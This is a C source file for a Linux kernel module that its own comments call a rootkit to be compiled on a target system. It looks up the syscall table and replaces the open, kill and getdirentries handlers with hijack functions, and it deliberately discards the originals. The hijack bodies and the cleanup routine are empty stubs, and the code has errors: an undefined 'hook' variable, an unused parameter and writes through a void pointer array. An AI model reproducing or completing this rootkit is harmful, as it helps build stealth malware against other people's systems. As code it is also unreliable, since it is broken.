// mantis.ko.c

// The rootkit part (the fancy part)
// Will be compiled on the target system (still working out specifics;
// we'll see.)

// TODO includes
#include<linux/kallsyms.h>

// This has all the `MODULE_*` macros
#define IS_KERNEL_MOD // important for signature
#include "../signature.h"

void change_syscall_loc(int syscall, void *loc, void *sys_call_table)
{
	/* Hook can also be used for unhooking syscalls, btw. */
	unprotect_memory();
	sys_call_table[syscall] = hook;
	protect_memory();
}

asmlinkage int open_hijack(int magic1, int magic2)
{
	// TODO
}

asmlinkage int kill_hijack(int magic1, int magic2)
{
	// TODO
}

asmlinkage int getdirentries_hijack(int magic1, int magic2)
{
	// TODO
}

static int __init module_init(void)
{
	sys_call_table = kallsyms_lookup("sys_call_table");
	
	// not getting old syscalls (we have no interest in that.) That data
	// shall be lost until reboot.
	change_syscall_loc(__NR_open, open_hijack, sys_call_table);
	change_syscall_loc(__NR_kill, kill_hijack, sys_call_table);
	change_syscall_loc(__NR_getdirentries, getdirentries_hijack,
										 sys_call_table);
}

static void __exit module_cleaup(void)
{
	// TODO
}

